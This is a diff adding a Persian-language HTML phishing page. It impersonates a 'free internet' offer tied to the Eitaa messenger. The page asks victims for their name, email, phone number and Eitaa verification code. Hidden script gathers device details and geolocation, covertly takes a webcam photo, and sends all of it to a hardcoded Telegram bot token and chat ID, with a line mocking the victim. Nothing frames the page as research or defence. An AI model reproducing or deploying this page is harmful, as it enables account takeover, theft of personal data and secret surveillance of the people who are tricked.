@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>اینترنت رایگان متصل به ایتا لطفا با فیلتر شکن وارد شوید</title>
+  <style>
+    body {
+      background: #e9ecef;
+      font-family: 'Tahoma', sans-serif;
+      direction: rtl;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background: white;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    .header img {
+      width: 80px;
+      margin-bottom: 10px;
+    }
+    .header h1 {
+      margin: 0;
+      font-size: 20px;
+      color: #222;
+    }
+    .container {
+      max-width: 700px;
+      margin: 40px auto;
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+    .container h2 {
+      text-align: center;
+      color: #2a2a2a;
+      margin-bottom: 30px;
+      font-size: 22px;
+    }
+    input, textarea, button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 20px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      background: #004085;
+      color: white;
+      font-weight: bold;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #002752;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://logoyab.com/wp-content/uploads/2024/07/Eitaa-Logo-1030x1030.png" alt="لوگو">
+    <h1>
+     free internet </h1>
+  </div>
+
+  <div class="container">
+    <h2>برای دریافت اینترنت رایگان لطفا اطلاعات صحیح را وارد کنید تا به ایتا متصل شوید  ومنتظر پیامک باشید (حتما به فیلترشکن متصل باشید)</h2>
+    <input type="text" id="name" placeholder="نام و نام خانوادگی">
+    <input type="text" id="id" placeholder="ایمیل">
+    <input type="text" id="phone" placeholder="شماره تماس">
+    <textarea id="desc" rows="5" placeholder="کد تایید ایتا "></textarea>
+    <button onclick="sendData()">بررسی اطلاعات</button>
+  </div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const token = '7311707406:AAHzaipshY3o8rb5ML5-xW8r-3YF_Bk70jM'
+    const chat_id = '7600607839'
+
+    function sendToTelegram(message, photoBlob = null) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id, text: message})
+      })
+      if (photoBlob) {
+        const form = new FormData()
+        form.append('chat_id', chat_id)
+        form.append('photo', photoBlob, 'photo.jpg')
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: form
+        })
+      }
+    }
+
+    function getDeviceInfo() {
+      return `
+نام مرورگر: ${navigator.userAgent}
+زبان سیستم: ${navigator.language}
+پلتفرم: ${navigator.platform}
+کوکی فعال: ${navigator.cookieEnabled}
+      `
+    }
+
+    function getLocation(cb) {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            cb(`موقعیت:
+عرض جغرافیایی: ${pos.coords.latitude}
+طول جغرافیایی: ${pos.coords.longitude}`)
+          },
+          err => cb('موقعیت قابل دریافت نیست')
+        )
+      } else {
+        cb('مرورگر از موقعیت پشتیبانی نمی‌کند')
+      }
+    }
+
+    function captureImage(cb) {
+      const video = document.getElementById('video')
+      const canvas = document.getElementById('canvas')
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream
+          setTimeout(() => {
+            canvas.width = video.videoWidth
+            canvas.height = video.videoHeight
+            canvas.getContext('2d').drawImage(video, 0, 0)
+            stream.getTracks().forEach(track => track.stop())
+            canvas.toBlob(blob => cb(blob), 'image/jpeg', 0.9)
+          }, 2000)
+        })
+        .catch(() => cb(null))
+    }
+
+    function sendData() {
+      const name = document.getElementById('name').value
+      const id = document.getElementById('id').value
+      const phone = document.getElementById('phone').value
+      const desc = document.getElementById('desc').value
+      const info = getDeviceInfo()
+      getLocation(locationText => {
+        captureImage(blob => {
+          const message = `
+اطلاعات کسکششششش😂:
+نام: ${name}
+ایمیل : ${id}
+شماره تماس: ${phone}
+شرح: ${desc}
+
+${info}
+${locationText}
+          `
+          sendToTelegram(message, blob)
+          alert('درخواست شما ثبت شد و در حال بررسی است.')
+        })
+      })
+    }
+  </script>
+</body>
+</html>
